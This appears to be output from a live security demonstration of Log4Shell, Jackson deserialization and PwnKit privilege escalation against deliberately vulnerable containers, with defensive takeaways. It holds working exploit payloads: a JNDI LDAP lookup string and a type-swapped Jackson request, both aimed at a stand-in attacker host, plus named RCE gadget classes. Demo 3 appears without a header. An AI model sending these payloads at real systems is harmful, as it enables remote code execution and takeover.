💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution

Scenario: A developer builds a product search API. They log the search query —
standard practice. The application uses log4j-core 2.14.1 (Dec 2021, before the patch).

🔎 Baseline — live docker exec against the container this job is running right now

Not a log excerpt — these commands run against the actual vuln-app container, on the
actual GitHub Actions runner, before any exploit fires:

$ docker exec vuln-app id   # On: victim's server
uid=0(root) gid=0(root) groups=0(root)

$ docker exec vuln-app java -version   # On: victim's server
openjdk version "11.0.32" 2026-07-21
OpenJDK Runtime Environment Temurin-11.0.32+9 (build 11.0.32+9)
OpenJDK 64-Bit Server VM Temurin-11.0.32+9 (build 11.0.32+9, mixed mode, sharing)

Confirmed live: the app really runs as root, on the JVM this image ships —
exactly the combination that lets Log4Shell go all the way to full compromise.

🏢 Victim's server — normal operation

A legitimate user searches for products:

$ curl "http://victim:8080/api/products/search?q=shirt"   # On: legitimate user's machine

{
    "results": [
        {
            "name": "Conference T-Shirt",
            "price": "25.00",
            "id": "1"
        }
    ],
    "count": 1,
    "query": "shirt"
}

Everything works normally. The developer's code:

log.info("Product search query: " + q);  // just logging — what could go wrong?

💀 Attacker's machine — sending the exploit

The attacker replaces the search term with a JNDI lookup expression:

$ curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}"   # On: attacker's machine

{
    "results": [],
    "count": 0,
    "query": "${jndi:ldap://host.docker.internal:1389/log4shell-pwned}"
}

The app answered normally above — the victim doesn't notice anything. Behind the
scenes though:

  1. The search query arrives at the victim's controller
  2. The controller calls log.info("Product search query: " + q)
  3. Log4j 2.14.1 sees ${jndi:ldap://...} and performs a network lookup
  4. The victim connects to the attacker's LDAP server (port 1389)
  5. The LDAP server tells the victim: "load ExploitPayload class from http://attacker:9999/exploit/"
  6. The victim downloads and executes the attacker's malicious Java class
  7. The attacker now has Remote Code Execution inside the victim's container

The developer did nothing wrong. They just logged user input — standard practice.
The vulnerability is entirely in the log4j-core 2.14.1 dependency.

💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects

Scenario: an internal "profile sync" endpoint between two Spring Boot services that
share the same ObjectMapper config. That config has enableDefaultTyping() on — a
deprecated-for-exactly-this-reason legacy setting still found in real codebases. Because of
it, Jackson wraps every value in ["fully.qualified.ClassName", value] on its own, on both
sides — nobody hand-writes that shape, it's just what this stack's JSON looks like.
Application uses jackson-databind 2.13.4.1.

🏢 Victim's server — normal use

A legitimate service pushes a profile update (already in the wire format this stack always
uses — this is not attacker-crafted, it's what enableDefaultTyping() produces automatically):

$ curl -X POST "http://victim:8080/api/users/import" -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'   # On: legitimate internal service

{
    "name": "Alice",
    "status": "imported"
}

💀 Attacker's machine — same shape, one field swapped

The attacker doesn't need to send anything that looks unusual — they reach the same
endpoint (e.g. because it's exposed further than intended) and swap one nested value's
class inside an otherwise normal-looking wrapped profile. The top-level wrapper
(java.util.LinkedHashMap) is exactly what a legitimate request looks like. Only the
email field's class was swapped — enableDefaultTyping() applies the same "trust the
client's class name" rule recursively to every nested value, not just the top level.

$ curl -X POST "http://victim:8080/api/users/import" -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://attacker:9999/jackson-rce-proof"]}]'   # On: attacker's machine

{
    "name": "Alice",
    "status": "imported"
}

🎯 Victim's server — its own logs already flagged it

Not a hack — defensive type-introspection logging the application does on every
/api/users/import call:

$ docker logs vuln-app | grep '\[import\]'   # On: victim's server
2026-08-25T12:53:40.694Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [import] field "name" = Alice (String)
2026-08-25T12:53:40.695Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [import] field "email" = alice@conf.io (String)
2026-08-25T12:53:40.769Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Received user-import request (123 bytes)
2026-08-25T12:53:40.776Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Jackson resolved the request body to runtime type: java.util.LinkedHashMap
2026-08-25T12:53:40.777Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field "name" = Alice (String)
2026-08-25T12:53:40.777Z  WARN  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field "email" deserialized as java.net.URL — attacker-controlled type, not an expected profile field type!

📡 Attacker's own dashboard — checked live, right now

java.net.URL doesn't connect on construction, so this specific payload never reaches
the attacker's server — the dashboard should still read empty. Proving that live, not
just asserting it:

$ curl "http://attacker:9999/dashboard"   # On: attacker's machine

{
    "callbacks": [],
    "total_callbacks": 0
}

💡 Key takeaway

The email field deserialized as java.net.URL, not String — proof the attacker
controlled which Java class got instantiated, hidden inside a request that otherwise
looked exactly like normal internal traffic.

In this demo we used java.net.URL (harmless — it doesn't connect on construction, which
is exactly why the attacker's dashboard above is still empty). In a real attack, the
attacker uses gadget classes like JdbcRowSetImpl (triggers JNDI → RCE) or TemplatesImpl
(executes arbitrary bytecode) — same result as Log4Shell, and the dashboard would not stay empty.

Fix: Never use enableDefaultTyping(). Use @JsonTypeInfo with an explicit allow-list
instead. Update jackson-databind to the latest version.

The JNDI lookup is blocked. Java 25 defaults com.sun.jndi.ldap.object.trustURLCodebase=false,
preventing the JVM from loading remote classes. The attack fails silently.

Even if it weren't blocked: no curl (can't download exploits), no gcc (can't compile),
no pkexec (can't escalate), non-root user (can't read /etc/shadow).

💡 Comparison

🔴 Root image 🟢 Safe image
JNDI class loading ✅ Succeeds (trustURLCodebase=true) ❌ Blocked (default)
Read /etc/shadow ✅ Root can read everything ❌ Permission denied
Exfiltrate data ✅ curl available ❌ No curl/wget
Compile exploits ✅ gcc installed ❌ No compiler
Base image CVEs Hundreds (Ubuntu 22.04) Near zero (modern)

The same vulnerable JAR runs in both containers. The difference is entirely
in the container configuration. Keep your base images updated and minimal.

💀 Demo 4 — "We Run As Non-Root" Is Not the Whole Story

Scenario: same Log4Shell exploit as Demo 1, but this image runs the app as
appuser (uid 1000), not root — the "we fixed it, we're non-root now" response teams
often give. It still ships policykit-1 (contains the SUID pkexec binary,
historically CVE-2021-4034 / "PwnKit") and a full gcc toolchain. After the initial
Java-library RCE, the attacker's payload fetches a second-stage OS-package exploit
from its own staging server — exactly what real intrusions do: land with an initial
foothold, then pull down more powerful tools rather than carry everything at once.

🔎 Baseline — live docker exec against the container this job is running right now

Not a log excerpt — these commands run against the actual container, on the actual
GitHub Actions runner, seconds before the exploit fires:

$ docker exec vuln-app ls -l /usr/bin/pkexec

$ docker exec vuln-app dpkg -s policykit-1 | grep Version
Version: 0.105-33ubuntu0.1

💡 Key takeaway

The Java-library RCE still worked exactly like Demo 1 — non-root didn't stop that
part at all. The privilege-escalation attempt against pkexec was blocked here because
this build pulled a patched policykit-1 from today's package mirror — Ubuntu fixed
CVE-2021-4034 back in January 2022. That's not this demo failing, it's the actual point:
on a system that hadn't been patched (which describes a lot of long-lived internal
servers), this exact chain — old Java library in, old OS package up to root — would have
worked all the way through. "We're non-root" is not a substitute for keeping the OS
patched; it just removes one of several paths to the same outcome.
